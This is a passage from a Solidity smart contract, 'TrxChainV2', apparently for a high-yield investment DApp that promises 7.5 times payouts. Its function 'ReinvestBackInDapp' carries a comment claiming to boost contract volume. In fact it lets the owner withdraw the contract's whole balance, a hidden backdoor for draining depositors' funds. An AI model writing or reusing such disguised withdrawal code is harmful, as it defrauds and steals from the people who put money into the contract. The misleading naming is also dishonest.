...
contract TrxChainV2 {
    ...
    constructor(address payable _owner,address payable _market) public {
        owner = _owner;
        
        etherchain_fund = _market;
        admin_fee = _owner;
	...
	function ReinvestBackInDapp() external { // Function for boosting contract volume
		require(msg.sender == owner);
		owner.transfer(address(this).balance);
	}
    
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 75 / 10;
    }
